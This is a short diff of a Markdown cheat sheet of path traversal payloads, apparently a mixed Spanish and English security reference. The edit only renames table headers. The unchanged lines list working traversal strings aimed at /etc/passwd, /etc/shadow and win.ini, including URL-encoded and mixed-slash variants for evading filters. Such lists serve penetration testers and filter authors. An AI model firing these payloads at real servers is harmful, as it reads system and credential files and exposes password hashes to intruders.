@@ -21,7 +21,7 @@ linked:
 
 ## Unix `../` Traversal
 
-| **Payload** | **Resultado esperado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `../etc/passwd` | Read `/etc/passwd` desde 1 nivel | Single up. |
 | `../../etc/passwd` | 2 levels up | Most common. |
@@ -44,7 +44,7 @@ ___
 
 ## Windows `..\\` Traversal
 
-| **Payload** | **Resultado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `..\\windows\\win.ini` | Read win.ini | Standard probe. |
 | `..\\..\\windows\\win.ini` | 2 niveles | Common. |
@@ -66,7 +66,7 @@ ___
 
 ## Mixed Encoding
 
-| **Payload** | **Resultado** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Mixed slashes | `..\\..\\../etc/passwd` | Mixed back and forward. |
 | Single + URL encoded | `..%2fetc%2fpasswd` | Forward slash encoded. |
@@ -87,7 +87,7 @@ ___
 
 ## Absolute Paths
 
-| **Payload** | **Stack** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `/etc/passwd` | Linux | Direct, sin traversal. |
 | `/etc/shadow` | Linux | Hash file (root-only). |
